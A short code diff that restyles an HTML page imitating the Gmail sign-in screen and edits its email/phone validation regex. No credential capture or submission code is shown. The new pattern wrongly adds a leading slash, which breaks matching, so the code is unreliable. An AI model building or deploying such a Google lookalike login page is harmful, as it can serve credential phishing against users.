@@ -46,6 +46,11 @@ float:right;
 }
 input{
 border:none;
+outline:none;
+padding:5px;
+margin:5px;
+font-size:25px;
+font-style:normal;
 }
 </style>
 </head>
@@ -55,7 +60,7 @@ border:none;
 <h3>to continue to Gmail</h3></center>
 <fieldset>
 <legend>Email or phone</legend>
-<input type = "text" required pattern = "^([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3})|(\d{3}-\d{3}-\d{4})$"/> 
+<input type = "text" required pattern = "/^([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3})|(\d{3}-\d{3}-\d{4})$"/> 
 </fieldset>
 <h3 id ="email"><a href="#">Forgot email?</a></h3>
 <h3>Not your computer? Use Guest mode to sign in privately.</h3>
